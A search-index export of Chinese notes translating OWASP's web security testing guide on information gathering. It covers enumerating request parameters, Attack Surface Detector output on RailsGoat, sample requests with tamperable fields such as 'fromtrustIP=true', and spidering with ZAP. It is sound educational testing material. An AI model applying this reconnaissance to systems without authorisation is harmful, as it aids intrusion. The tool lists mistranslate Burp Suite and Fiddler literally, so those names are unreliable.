WebSockets\uff0c\u4ee5\u53ca\u4efb\u4f55\u5176\u4ed6\u76f8\u5173\u8bf4\u660e\u3002\u4e00\u65e6\u4ed6\u4eec\u89c4\u5212\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5e76\u6d4b\u8bd5\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u5e76\u8bb0\u5f55\u54ea\u4e9b\u6709\u6548\uff0c\u54ea\u4e9b\u65e0\u6548\u3002\u672c\u6307\u5357\u7684\u5176\u4f59\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u6bcf\u4e2a\u611f\u5174\u8da3\u7684\u9886\u57df\uff0c</p> <p>\u4ee5\u4e0b\u662f\u6240\u6709\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u4e00\u4e9b\u8981\u70b9\u3002\u5728\u8bf7\u6c42\u90e8\u5206\uff0c\u91cd\u70b9\u5173\u6ce8 GET \u548c POST \u65b9\u6cd5\uff0c\u56e0\u4e3a\u5b83\u4eec\u51fa\u73b0\u5728\u5927\u591a\u6570\u8bf7\u6c42\u4e2d\u3002\u8bf7\u6ce8\u610f\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u4f8b\u5982 PUT \u548c DELETE\u3002\u901a\u5e38\uff0c\u5982\u679c\u5141\u8bb8\uff0c\u8fd9\u4e9b\u66f4\u7f55\u89c1\u7684\u8bf7\u6c42\u53ef\u80fd\u4f1a\u66b4\u9732\u6f0f\u6d1e\u3002\u672c\u6307\u5357\u4e2d\u6709\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u6d4b\u8bd5\u8fd9\u4e9b HTTP \u65b9\u6cd5\u7684\u90e8\u5206\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_39","title":"\u8981\u6c42","text":"<ul> <li>\u786e\u5b9a\u5728\u4f55\u5904\u4f7f\u7528 GET \u548c\u5728\u4f55\u5904\u4f7f\u7528 POST\u3002</li> <li>\u8bc6\u522b POST \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u8fd9\u4e9b\u5728\u8bf7\u6c42\u7684\u6b63\u6587\u4e2d\uff09\u3002</li> <li>\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7279\u522b\u6ce8\u610f\u4efb\u4f55\u9690\u85cf\u53c2\u6570\u3002\u53d1\u9001 POST \u65f6\uff0c\u6240\u6709\u8868\u5355\u5b57\u6bb5\uff08\u5305\u62ec\u9690\u85cf\u53c2\u6570\uff09\u90fd\u5c06\u5728 HTTP \u6d88\u606f\u6b63\u6587\u4e2d\u53d1\u9001\u5230\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u770b\u4e0d\u5230\u7684\uff0c\u9664\u975e\u4f7f\u7528\u4ee3\u7406\u6216\u67e5\u770b HTML \u6e90\u4ee3\u7801\u3002\u6b64\u5916\uff0c\u663e\u793a\u7684\u4e0b\u4e00\u9875\u3001\u5176\u6570\u636e\u548c\u8bbf\u95ee\u7ea7\u522b\u90fd\u53ef\u80fd\u56e0\u9690\u85cf\u53c2\u6570\u7684\u503c\u800c\u5f02\u3002</li> <li>\u8bc6\u522b GET \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u5373 URL\uff09\uff0c\u7279\u522b\u662f\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u901a\u5e38\u5728 ? \u6807\u8bb0\u4e4b\u540e\uff09\u3002</li> <li>\u8bc6\u522b\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6240\u6709\u53c2\u6570\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u6210\u5bf9\u683c\u5f0f\uff0c\u4f8b\u5982<code>foo=bar</code>.\u00a0\u53e6\u8bf7\u6ce8\u610f\uff0c\u8bb8\u591a\u53c2\u6570\u53ef\u4ee5\u5728\u4e00\u4e2a\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff0c\u4f8b\u5982\u7531<code>&amp;</code>,\u00a0<code>\\~</code>,<code>:</code>\u6216\u4efb\u4f55\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\u6216\u7f16\u7801\u5206\u9694\u3002</li> <li>\u5728\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216 POST \u8bf7\u6c42\u4e2d\u7684\u591a\u4e2a\u53c2\u6570\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6267\u884c\u653b\u51fb\u9700\u8981\u90e8\u5206\u6216\u5168\u90e8\u53c2\u6570\u3002\u6d4b\u8bd5\u4eba\u5458\u9700\u8981\u8bc6\u522b\u6240\u6709\u53c2\u6570\uff08\u5373\u4f7f\u5df2\u7f16\u7801\u6216\u52a0\u5bc6\uff09\u5e76\u8bc6\u522b\u54ea\u4e9b\u53c2\u6570\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3002\u6307\u5357\u7684\u540e\u9762\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u8fd9\u4e9b\u53c2\u6570\u3002\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u53ea\u9700\u786e\u4fdd\u5b83\u4eec\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u88ab\u8bc6\u522b\u51fa\u6765\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u901a\u5e38\u770b\u4e0d\u5230\u7684\u4efb\u4f55\u5176\u4ed6\u6216\u81ea\u5b9a\u4e49\u7c7b\u578b\u6807\u5934\uff08\u4f8b\u5982<code>debug: false</code>\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_40","title":"\u56de\u5e94","text":"<ul> <li>\u786e\u5b9a\u65b0 cookie \u7684\u8bbe\u7f6e\uff08<code>Set-Cookie</code>\u6807\u5934\uff09\u3001\u4fee\u6539\u6216\u6dfb\u52a0\u4f4d\u7f6e\u3002</li> <li>\u786e\u5b9a\u5728\u6b63\u5e38\u54cd\u5e94\uff08\u5373\u672a\u4fee\u6539\u7684\u8bf7\u6c42\uff09\u671f\u95f4\u5b58\u5728\u4efb\u4f55\u91cd\u5b9a\u5411\uff083xx HTTP \u72b6\u6001\u4ee3\u7801\uff09\u3001400 \u72b6\u6001\u4ee3\u7801\uff08\u5c24\u5176\u662f 403 Forbidden\uff09\u548c 500 \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4f7f\u7528\u4efb\u4f55\u6709\u8da3\u7684\u6807\u5934\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>Server: BIG-IP</code>\u8868\u793a\u8be5\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u5e76\u4e14\u4e00\u53f0\u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4e0d\u5f97\u4e0d\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u6765\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u8d1f\u8f7d\u5e73\u8861\u7c7b\u578b\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#owasp","title":"OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668","text":"<p>Attack Surface Detector (ASD) \u5de5\u5177\u8c03\u67e5\u6e90\u4ee3\u7801\u5e76\u53d1\u73b0 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u7aef\u70b9\u3001\u8fd9\u4e9b\u7aef\u70b9\u63a5\u53d7\u7684\u53c2\u6570\u4ee5\u53ca\u8fd9\u4e9b\u53c2\u6570\u7684\u6570\u636e\u7c7b\u578b\u3002\u8fd9\u5305\u62ec\u8718\u86db\u65e0\u6cd5\u627e\u5230\u7684\u672a\u94fe\u63a5\u7aef\u70b9\uff0c\u6216\u5ba2\u6237\u7aef\u4ee3\u7801\u4e2d\u5b8c\u5168\u672a\u4f7f\u7528\u7684\u53ef\u9009\u53c2\u6570\u3002\u5b83\u8fd8\u80fd\u591f\u8ba1\u7b97\u5e94\u7528\u7a0b\u5e8f\u4e24\u4e2a\u7248\u672c\u4e4b\u95f4\u653b\u51fb\u9762\u7684\u53d8\u5316\u3002</p> <p>Attack Surface Detector \u53ef\u4f5c\u4e3a ZAP \u548c Burp Suite \u7684\u63d2\u4ef6\u4f7f\u7528\uff0c\u8fd8\u63d0\u4f9b\u547d\u4ee4\u884c\u5de5\u5177\u3002\u547d\u4ee4\u884c\u5de5\u5177\u5c06\u653b\u51fb\u9762\u5bfc\u51fa\u4e3a JSON \u8f93\u51fa\uff0c\u7136\u540e\u53ef\u4f9b ZAP \u548c Burp Suite \u63d2\u4ef6\u4f7f\u7528\u3002\u8fd9\u5bf9\u4e8e\u672a\u76f4\u63a5\u5411\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u60c5\u51b5\u5f88\u6709\u5e2e\u52a9\u3002\u4f8b\u5982\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u4e0d\u60f3\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u5ba2\u6237\u90a3\u91cc\u83b7\u53d6 json \u8f93\u51fa\u6587\u4ef6\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_41","title":"\u5982\u4f55\u4f7f\u7528","text":"<p>CLI jar \u6587\u4ef6\u53ef\u4ecehttps://github.com/secdec/attack-surface-detector-cli/releases\u4e0b\u8f7d\u3002</p> <p>\u60a8\u53ef\u4ee5\u4e3a ASD \u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ee5\u4ece\u76ee\u6807 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u4e2d\u8bc6\u522b\u7aef\u70b9\u3002</p> <p><code>java -jar attack-surface-detector-cli-1.3.5.jar &lt;source-code-path&gt; [flags]</code></p> <p>\u8fd9\u662f\u9488\u5bf9OWASP RailsGoat\u8fd0\u884c\u547d\u4ee4\u7684\u793a\u4f8b\u3002</p> <pre><code>$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '&lt;...&gt;/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '&lt;...&gt;/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n</code></pre> <p>\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>-json</code>\u6807\u5fd7\u751f\u6210\u4e00\u4e2a JSON \u8f93\u51fa\u6587\u4ef6\uff0c\u63d2\u4ef6\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e ZAP \u548c Burp Suite\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u94fe\u63a5\u3002</p> <ul> <li>OWASP ZAP \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> <li>PortSwigger Burp \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_42","title":"\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9","text":"<p>\u4ee5\u4e0b\u662f\u6709\u5173\u5982\u4f55\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9\u7684\u4e24\u4e2a\u793a\u4f8b\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#1","title":"\u793a\u4f8b 1","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4ece\u5728\u7ebf\u8d2d\u7269\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8d2d\u4e70\u5546\u54c1\u3002</p> <pre><code>GET\u00a0/shoppingApp/buyme.asp?CUSTOMERID=100&amp;ITEM=z101a&amp;PRICE=62.50&amp;IP=x.x.x.x HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n</code></pre> <p>\u8bf7\u6c42\u7684\u6240\u6709\u53c2\u6570\uff0c\u5982 CUSTOMERID\u3001ITEM\u3001PRICE\u3001IP \u548c Cookie\uff0c\u8fd9\u4e9b\u53c2\u6570\u53ef\u4ee5\u53ea\u662f\u7f16\u7801\u53c2\u6570\u6216\u7528\u4e8e\u4f1a\u8bdd\u72b6\u6001\u7684\u53c2\u6570\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#2","title":"\u793a\u4f8b 2","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a POST \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4f7f\u60a8\u767b\u5f55\u5230\u5e94\u7528\u7a0b\u5e8f\u3002</p> <pre><code>POST\u00a0/example/authenticate.asp?service=login HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&amp;pass=pass123&amp;debug=true&amp;fromtrustIP=true\n</code></pre> <p>\u53ef\u4ee5\u6ce8\u610f\u5230\u53c2\u6570\u5728\u51e0\u4e2a\u4f4d\u7f6e\u53d1\u9001\uff1a</p> <ol> <li>\u5728\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff1a<code>service</code></li> <li>\u5728 Cookie \u6807\u5934\u4e2d\uff1a<code>SESSIONID</code>,<code>CustomCookie</code></li> <li>\u5728\u8bf7\u6c42\u6b63\u6587\u4e2d\uff1a<code>user</code>,\u00a0<code>pass</code>,\u00a0<code>debug</code>,<code>fromtrustIP</code></li> </ol> <p>\u62e5\u6709\u5404\u79cd\u6ce8\u5165\u4f4d\u7f6e\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e86\u94fe\u63a5\u7684\u53ef\u80fd\u6027\uff0c\u53ef\u4ee5\u63d0\u9ad8\u5728\u5904\u7406\u4ee3\u7801\u4e2d\u53d1\u73b0\u9519\u8bef\u7684\u673a\u4f1a\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_43","title":"\u5de5\u5177","text":"<ul> <li>OWASP Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u6253\u55dd\u5957\u623f</li> <li>\u63d0\u7434\u624b</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_44","title":"\u53c2\u8003","text":"<ul> <li>RFC 2616 \u2013 \u8d85\u6587\u672c\u4f20\u8f93\u200b\u200b\u534f\u8bae \u2013 HTTP 1.1</li> <li>OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_45","title":"\u901a\u8fc7\u5e94\u7528\u6620\u5c04\u6267\u884c\u8def\u5f84","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_46","title":"\u6982\u62ec","text":"<p>\u5728\u5f00\u59cb\u5b89\u5168\u6d4b\u8bd5\u4e4b\u524d\uff0c\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u7ed3\u6784\u81f3\u5173\u91cd\u8981\u3002\u5982\u679c\u5bf9\u5e94\u7528\u7a0b\u5e8f\u7684\u5e03\u5c40\u6ca1\u6709\u900f\u5f7b\u7684\u4e86\u89e3\uff0c\u5c31\u4e0d\u53ef\u80fd\u5bf9\u5176\u8fdb\u884c\u5f7b\u5e95\u7684\u6d4b\u8bd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_47","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u6620\u5c04\u76ee\u6807\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e86\u89e3\u4e3b\u8981\u5de5\u4f5c\u6d41\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_48","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u9ed1\u76d2\u6d4b\u8bd5\u4e2d\uff0c\u6d4b\u8bd5\u6574\u4e2a\u4ee3\u7801\u5e93\u662f\u6781\u5176\u56f0\u96be\u7684\u3002\u4e0d\u4ec5\u4ec5\u662f\u56e0\u4e3a\u6d4b\u8bd5\u4eba\u5458\u770b\u4e0d\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u4ee3\u7801\u8def\u5f84\uff0c\u800c\u4e14\u5373\u4f7f\u4ed6\u4eec\u770b\u5230\u4e86\uff0c\u6d4b\u8bd5\u6240\u6709\u4ee3\u7801\u8def\u5f84\u4e5f\u4f1a\u975e\u5e38\u8017\u65f6\u3002\u534f\u8c03\u8fd9\u4e00\u70b9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u8bb0\u5f55\u53d1\u73b0\u548c\u6d4b\u8bd5\u7684\u4ee3\u7801\u8def\u5f84\u3002</p> <p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u6d4b\u8bd5\u548c\u6d4b\u91cf\u4ee3\u7801\u8986\u76d6\u7387\uff1a</p> <ul> <li>PATH -  \u6d4b\u8bd5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u6761\u8def\u5f84\uff0c\u5305\u62ec\u9488\u5bf9\u6bcf\u6761\u51b3\u7b56\u8def\u5f84\u7684\u7ec4\u5408\u548c\u8fb9\u754c\u503c\u5206\u6790\u6d4b\u8bd5\u3002\u867d\u7136\u8fd9\u79cd\u65b9\u6cd5\u63d0\u4f9b\u4e86\u5f7b\u5e95\u6027\uff0c\u4f46\u53ef\u6d4b\u8bd5\u8def\u5f84\u7684\u6570\u91cf\u968f\u7740\u6bcf\u4e2a\u51b3\u7b56\u5206\u652f\u5448\u6307\u6570\u589e\u957f\u3002</li> <li>Data Flow (or Taint Analysis)\u00a0- \u901a\u8fc7\u5916\u90e8\u4ea4\u4e92\uff08\u901a\u5e38\u662f\u7528\u6237\uff09\u6d4b\u8bd5\u53d8\u91cf\u7684\u5206\u914d\u3002\u4e13\u6ce8\u4e8e\u6620\u5c04\u6574\u4e2a\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6570\u636e\u7684\u6d41\u52a8\u3001\u8f6c\u6362\u548c\u4f7f\u7528\u3002</li> <li>Race\u00a0- \u6d4b\u8bd5\u5904\u7406\u76f8\u540c\u6570\u636e\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u591a\u4e2a\u5e76\u53d1\u5b9e\u4f8b\u3002</li> </ul> <p>\u5e94\u4e0e\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u534f\u5546\u6743\u8861\u4f7f\u7528\u4f55\u79cd\u65b9\u6cd5\u4ee5\u53ca\u6bcf\u79cd\u65b9\u6cd5\u7684\u4f7f\u7528\u7a0b\u5ea6\u3002\u4e5f\u53ef\u4ee5\u91c7\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8be2\u95ee\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u4ed6\u4eec\u7279\u522b\u5173\u6ce8\u54ea\u4e9b\u529f\u80fd\u6216\u4ee3\u7801\u6bb5\u4ee5\u53ca\u5982\u4f55\u5230\u8fbe\u8fd9\u4e9b\u4ee3\u7801\u6bb5\u3002</p> <p>\u4e3a\u4e86\u5411\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5c55\u793a\u4ee3\u7801\u8986\u76d6\u7387\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u7535\u5b50\u8868\u683c\u5f00\u59cb\u5e76\u8bb0\u5f55\u901a\u8fc7\u722c\u53d6\u5e94\u7528\u7a0b\u5e8f\uff08\u624b\u52a8\u6216\u81ea\u52a8\uff09\u53d1\u73b0\u7684\u6240\u6709\u94fe\u63a5\u3002\u7136\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u66f4\u4ed4\u7ec6\u5730\u67e5\u770b\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u51b3\u7b56\u70b9\uff0c\u5e76\u8c03\u67e5\u53d1\u73b0\u4e86\u591a\u5c11\u91cd\u8981\u7684\u4ee3\u7801\u8def\u5f84\u3002\u7136\u540e\u5e94\u5c06\u8fd9\u4e9b\u8bb0\u5f55\u5728\u7535\u5b50\u8868\u683c\u4e2d\uff0c\u5176\u4e2d\u5305\u542b\u6240\u53d1\u73b0\u8def\u5f84\u7684 URL\u3001\u6563\u6587\u548c\u5c4f\u5e55\u622a\u56fe\u63cf\u8ff0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_49","title":"\u81ea\u52a8\u6293\u53d6","text":"<p>\u81ea\u52a8\u8718\u86db\u662f\u4e00\u79cd\u7528\u4e8e\u81ea\u52a8\u53d1\u73b0\u7279\u5b9a\u7f51\u7ad9\u4e0a\u7684\u65b0\u8d44\u6e90\uff08URL\uff09\u7684\u5de5\u5177\u3002\u5b83\u4ee5\u8981\u8bbf\u95ee\u7684 URL \u5217\u8868\u5f00\u59cb\uff0c\u79f0\u4e3a\u79cd\u5b50\uff0c\u8fd9\u53d6\u51b3\u4e8e Spider \u7684\u542f\u52a8\u65b9\u5f0f\u3002\u867d\u7136\u6709\u5f88\u591a Spidering \u5de5\u5177\uff0c\u4f46\u4ee5\u4e0b\u793a\u4f8b\u4f7f\u7528Zed Attack Proxy (ZAP)\uff1a</p> <p> \u56fe 4.1.7-1\uff1aZed \u653b\u51fb\u4ee3\u7406\u5c4f\u5e55</p> <p>ZAP\u63d0\u4f9b\u5404\u79cd\u81ea\u52a8\u722c\u53d6\u9009\u9879\uff0c\u53ef\u4ee5\u6839\u636e\u6d4b\u8bd5\u4eba\u5458\u7684\u9700\u8981\u52a0\u4ee5\u5229\u7528\uff1a</p> <ul> <li>\u8718\u86db</li> <li>AJAX\u8718\u86db</li> <li>OpenAPI \u652f\u6301</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_50","title":"\u5de5\u5177","text":"<ul> <li>Zed \u653b\u51fb\u4ee3\u7406 (ZAP)</li> <li>\u7535\u5b50\u8868\u683c\u8f6f\u4ef6\u5217\u8868</li> <li>\u7ed8\u56fe\u8f6f\u4ef6</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_51","title":"\u53c2\u8003","text":"<ul> <li>\u4ee3\u7801\u8986\u76d6\u7387</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web_1","title":"WEB\u5e94\u7528\u6307\u7eb9\u8bc6\u522b","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_52","title":"\u6982\u62ec","text":"<p>\u592a\u9633\u5e95\u4e0b\u6ca1\u6709\u65b0\u9c9c\u4e8b\uff0c\u4eba\u4eec\u53ef\u80fd\u60f3\u5230\u8981\u5f00\u53d1\u7684\u51e0\u4e4e\u6240\u6709 Web 